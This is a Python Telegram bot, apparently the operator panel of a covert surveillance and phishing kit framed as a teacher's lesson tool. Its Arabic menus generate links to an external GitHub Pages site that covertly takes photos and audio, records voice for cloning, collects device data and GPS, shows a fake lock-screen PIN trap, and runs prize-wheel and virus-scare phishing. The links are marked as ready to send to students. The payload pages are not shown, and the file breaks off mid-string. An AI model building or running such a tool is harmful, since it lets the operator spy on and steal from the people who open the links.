#!/usr/bin/env python3
"""
Secure Telegram bot: reads BOT_TOKEN from environment; supports ADMIN lock, webhook or polling.
"""
import os
import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Configuration from environment
BOT_TOKEN = os.environ.get("BOT_TOKEN")
if not BOT_TOKEN:
    raise RuntimeError("BOT_TOKEN environment variable is required. Set it in your host (Render secrets).")

GITHUB_BASE_URL = os.environ.get("GITHUB_BASE_URL", "https://yunes2009.github.io/Yee")
RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL")

# Admin control (comma-separated IDs and usernames)
ADMIN_IDS = set()
for x in os.environ.get("ADMIN_ID", "").split(","):
    x = x.strip()
    if x.isdigit():
        ADMIN_IDS.add(int(x))
ADMIN_USERNAMES = set(p.strip().lstrip("@").lower() for p in os.environ.get("ADMIN_USERNAME", "").split(",") if p.strip())

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)
if not ADMIN_IDS and not ADMIN_USERNAMES:
    logger.warning("No ADMIN_ID or ADMIN_USERNAME set; admin checks are disabled (not recommended).")


def _get_user_from_update(update: Update):
    if update.effective_user:
        return update.effective_user
    if update.callback_query and update.callback_query.from_user:
        return update.callback_query.from_user
    return None


def is_admin(update: Update) -> bool:
    user = _get_user_from_update(update)
    if not user:
        return False
    # If no admin configured, allow all (backwards compatibility)
    if not ADMIN_IDS and not ADMIN_USERNAMES:
        return True
    if user.id in ADMIN_IDS:
        return True
    if user.username and user.username.lower() in ADMIN_USERNAMES:
        return True
    return False


async def send_main_menu_target(target, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📸 الوحدة 1: خدع الصور والأذونات", callback_data="u1_menu")],
        [InlineKeyboardButton("🎙️ الوحدة 2: خدع الصوت والتنصت", callback_data="u2_menu")],
        [InlineKeyboardButton("📱 الوحدة 3: الهاتف وكلمات السر", callback_data="u3_menu")],
        [InlineKeyboardButton("⚠️ الوحدة 4: الابتزاز والهندسة الاجتماعية", callback_data="u4_menu")],
        [InlineKeyboardButton("🛡️ الوحدة 5: التأمين واستخراج الخبايا", callback_data="u5_menu")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    text = (
        "🎓 *لوحة تحكم الأستاذ - التجارب التفاعلية الحية*\n"
        "اختر الوحدة الدراسية لتوليد رابط الخدعة الذي سترسله للطلاب."
    )
    if hasattr(target, "edit_message_text"):
        await target.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
    else:
        await target.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update):
        if update.callback_query:
            await update.callback_query.answer("❌ غير مصرح. هذه لوحة خاصة بالأستاذ فقط.", show_alert=True)
        else:
            await update.message.reply_text("❌ غير مصرح. هذه لوحة خاصة بالأستاذ فقط.")
        return
    if update.callback_query:
        await send_main_menu_target(update.callback_query, context)
    else:
        await send_main_menu_target(update.message, context)


async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if not is_admin(update):
        await query.answer("❌ غير مصرح لك. هذه لوحة خاصة بالأستاذ.", show_alert=True)
        return
    await query.answer()
    data = query.data

    if data == "u1_menu":
        kb = [
            [InlineKeyboardButton("📸 التقاط صورة واحدة خاطفة", callback_data="gen_u1_snap1")],
            [InlineKeyboardButton("🎞️ سحب 3 صور متتالية (تسلسلي)", callback_data="gen_u1_snap3")],
            [InlineKeyboardButton("🔍 سحب بيانات EXIF للموقع مع الصورة", callback_data="gen_u1_exif")],
            [InlineKeyboardButton("⬅️ العودة للقائمة الرئيسية", callback_data="main_menu")],
        ]
        await query.edit_message_text("📸 *الوحدة الأولى: خدع الصور والتقاطها*\nاختر التجربة المراد توليد رابطها:", reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
        return

    if data == "u2_menu":
        kb = [
            [InlineKeyboardButton("🎧 تسجيل صوتي سريع (3 ثوانٍ)", callback_data="gen_u2_rec3")],
            [InlineKeyboardButton("🗣️ تنصت وتماثل صوتي (استنسخ صوت)", callback_data="gen_u2_stream")],
            [InlineKeyboardButton("⬅️ العودة للقائمة الرئيسية", callback_data="main_menu")],
        ]
        await query.edit_message_text("🎙️ *الوحدة الثانية: خدع الصوت*\nاختر التجربة المراد توليد رابطها:", reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
        return

    if data == "u3_menu":
        kb = [
            [InlineKeyboardButton("🔋 سحب معلومات الجهاز والبطارية كاملة", callback_data="gen_u3_sys")],
            [InlineKeyboardButton("🔑 خدعة صفحة قفل الشاشة المزيفة", callback_data="gen_u3_pin")],
            [InlineKeyboardButton("⬅️ العودة للقائمة الرئيسية", callback_data="main_menu")],
        ]
        await query.edit_message_text("📱 *الوحدة الثالثة: الهواتف والسرية*\nاختر التجربة المراد توليد رابطها:", reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
        return

    if data == "u4_menu":
        kb = [
            [InlineKeyboardButton("🎁 فخ عجلة الحظ والجوائز (Phishing)", callback_data="gen_u4_wheel")],
            [InlineKeyboardButton("🚨 فخ إنذار الفيروسات والتخويف", callback_data="gen_u4_scare")],
            [InlineKeyboardButton("⬅️ العودة للقائمة الرئيسية", callback_data="main_menu")],
        ]
        await query.edit_message_text("⚠️ *الوحدة الرابعة: الابتزاز والهندسة الاجتماعية*\nاختر التجربة المراد توليد رابطها:", reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
        return

    if data == "u5_menu":
        kb = [
            [InlineKeyboardButton("📍 كشف الموقع الجغرافي دقيقاً (GPS)", callback_data="gen_u5_gps")],
            [InlineKeyboardButton("🧪 فحص الأذونات الشامل (All-in-One)", callback_data="gen_u5_full")],
            [InlineKeyboardButton("⬅️ العودة للقائمة الرئيسية", callback_data="main_menu")],
        ]
        await query.edit_message_text("🛡️ *الوحدة الخامسة: التأمين والحماية*\nاختر التجربة المراد توليد رابطها:", reply_markup=InlineKeyboardMarkup(kb), parse_mode=ParseMode.MARKDOWN)
        return

    if data == "main_menu":
        await start(update, context)
        return

    if data.startswith("gen_"):
        mode = data.replace("gen_", "")
        generated_link = f"{GITHUB_BASE_URL.rstrip('/')}/index.html?mode={mode}"

        reply_msg = (
            f"🔗 *الرابط الجاهز للإرسال للطلاب:*
{